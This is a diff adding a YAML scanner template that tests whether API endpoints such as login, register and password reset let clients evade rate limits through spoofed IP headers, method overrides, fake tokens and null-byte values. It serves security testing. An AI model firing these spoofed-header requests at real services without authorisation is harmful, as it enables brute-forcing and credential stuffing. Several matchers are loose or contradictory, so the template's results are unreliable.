@@ -1,0 +1,417 @@
+id: medium-webapp-api-rate-limit-bypass-headers
+
+info:
+  name: API Rate Limit Bypass via Headers
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects API endpoints that can bypass rate limiting through manipulation of HTTP headers.
+    Common bypass techniques include using X-Forwarded-For, X-Real-IP, X-Originating-IP,
+    and other headers to spoof client identity and circumvent rate limiting controls.
+  reference:
+    - https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Rate%20Limit%20Bypass
+    - https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L
+    cvss-score: 5.3
+    cwe-id: CWE-770
+  tags: rate-limit,bypass,headers,api,dos,medium
+
+http:
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: {{ip}}
+        X-Real-IP: {{ip}}
+        X-Originating-IP: {{ip}}
+        X-Remote-IP: {{ip}}
+        X-Client-IP: {{ip}}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Forwarded-For: {{ip}}
+        X-Real-IP: {{ip}}
+        X-Originating-IP: {{ip}}
+        
+        {"test": "rate_limit_bypass"}
+
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: {{ip}}
+        X-Cluster-Client-IP: {{ip}}
+        CF-Connecting-IP: {{ip}}
+        True-Client-IP: {{ip}}
+
+    payloads:
+      path:
+        - "/api/login"
+        - "/api/register"
+        - "/api/reset"
+        - "/api/verify"
+        - "/api/search"
+        - "/api/data"
+        - "/api/users"
+        - "/api/posts"
+        - "/login"
+        - "/register"
+        - "/search"
+        - "/contact"
+        - "/feedback"
+        - "/api/contact"
+
+      ip:
+        - "127.0.0.1"
+        - "192.168.1.1"
+        - "10.0.0.1"
+        - "172.16.0.1"
+        - "8.8.8.8"
+        - "1.1.1.1"
+        - "203.0.113.1"
+        - "198.51.100.1"
+
+    attack: clusterbomb
+    threads: 8
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 202
+          - 302
+
+      - type: word
+        words:
+          - "rate limit"
+          - "too many requests"
+          - "429"
+          - "throttled"
+          - "quota exceeded"
+        condition: or
+        negative: true
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: successful_bypass
+        regex:
+          - '(?i)(success|ok|valid|accepted)'
+
+      - type: kval
+        kval:
+          - x_ratelimit_remaining
+          - x_ratelimit_limit
+          - retry_after
+
+# Test with User-Agent manipulation
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: {{user_agent}}
+        X-Forwarded-For: 127.0.0.1
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: {{user_agent}}
+        X-Real-IP: 192.168.1.1
+        
+        {"action": "test"}
+
+    payloads:
+      path:
+        - "/api/search"
+        - "/api/data"
+        - "/search"
+
+      user_agent:
+        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        - "curl/7.68.0"
+        - "PostmanRuntime/7.26.8"
+        - "python-requests/2.25.1"
+        - "Googlebot/2.1"
+        - "bingbot/2.0"
+        - "facebookexternalhit/1.1"
+
+    attack: clusterbomb
+    threads: 5
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        words:
+          - "rate"
+          - "limit"
+          - "429"
+        condition: or
+        negative: true
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: user_agent_bypass
+        regex:
+          - '(?i)(success|data|results)'
+
+# Test with HTTP method override
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-HTTP-Method-Override: GET
+        X-Forwarded-For: 10.0.0.1
+        
+        {"method_override": "test"}
+
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        X-HTTP-Method-Override: POST
+        X-Real-IP: 172.16.0.1
+
+    payloads:
+      path:
+        - "/api/users"
+        - "/api/data"
+        - "/api/search"
+
+    attack: pitchfork
+    threads: 5
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 405
+
+      - type: word
+        words:
+          - "method"
+          - "override"
+          - "data"
+          - "success"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: method_override_response
+        regex:
+          - '(?i)(method.*override|success|data)'
+
+# Test with authorization header bypass
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer fake-token
+        X-Forwarded-For: 8.8.8.8
+        X-Real-IP: 8.8.8.8
+
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic dGVzdDp0ZXN0
+        X-Originating-IP: 1.1.1.1
+        X-Client-IP: 1.1.1.1
+
+    payloads:
+      path:
+        - "/api/protected"
+        - "/api/user"
+        - "/api/profile"
+        - "/api/admin"
+
+    attack: pitchfork
+    threads: 5
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 401
+          - 403
+
+      - type: word
+        words:
+          - "unauthorized"
+          - "forbidden"
+          - "rate"
+          - "limit"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: auth_bypass_attempt
+        regex:
+          - '(?i)(unauthorized|forbidden|invalid.*token)'
+
+# Test with custom headers and null bytes
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1%00
+        X-Real-IP: 192.168.1.1%00
+        X-Custom-IP: 10.0.0.1
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Forwarded-For: 127.0.0.1,192.168.1.1
+        X-Cluster-Client-IP: 10.0.0.1
+        
+        {"bypass": "test"}
+
+    payloads:
+      path:
+        - "/api/login"
+        - "/api/register"
+        - "/login"
+
+    attack: pitchfork
+    threads: 3
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 400
+
+      - type: word
+        words:
+          - "success"
+          - "login"
+          - "register"
+          - "invalid"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: null_byte_response
+        regex:
+          - '(?i)(success|invalid|error)'
+
+# Test with proxy headers
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Via: 1.1 proxy.example.com
+        X-Forwarded-Proto: https
+        X-Forwarded-Host: example.com
+        X-Forwarded-For: 203.0.113.1
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Forwarded-Server: proxy.internal.com
+        X-Forwarded-For: 198.51.100.1
+        Forwarded: for=192.0.2.1;proto=https;by=proxy.example.com
+        
+        {"proxy_test": "bypass"}
+
+    payloads:
+      path:
+        - "/api/data"
+        - "/api/search"
+        - "/search"
+
+    attack: pitchfork
+    threads: 3
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        words:
+          - "data"
+          - "search"
+          - "results"
+          - "success"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: proxy_bypass_response
+        regex:
+          - '(?i)(data|search|results|success)'
+
+# Test with CDN and load balancer headers
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        CF-Connecting-IP: 104.16.1.1
+        CF-Ray: 123456789abcdef0-LAX
+        X-Forwarded-For: 104.16.1.1
+
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Azure-ClientIP: 13.107.42.14
+        X-Azure-SocketIP: 13.107.42.14
+        X-Forwarded-For: 13.107.42.14
+
+    payloads:
+      path:
+        - "/api/users"
+        - "/api/posts"
+        - "/api/comments"
+
+    attack: pitchfork
+    threads: 3
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "users"
+          - "posts"
+          - "comments"
+          - "data"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: cdn_bypass_response
+        regex:
+          - '(?i)(users|posts|comments|data)'
+
+      - type: kval
+        kval:
+          - cf_ray
+          - x_azure_ref
